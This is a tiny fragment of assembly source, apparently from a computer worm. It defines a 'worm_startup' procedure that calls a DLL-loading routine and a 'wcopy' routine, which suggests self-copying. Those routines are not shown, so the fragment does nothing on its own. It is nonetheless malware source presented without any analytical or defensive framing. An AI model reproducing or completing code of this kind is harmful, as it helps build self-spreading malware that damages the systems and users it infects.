locals __
locals @@
__x equ rec;dta

worm_startup proc

	call loaddll1
	xcall wcopy	
	ret

worm_startup endp


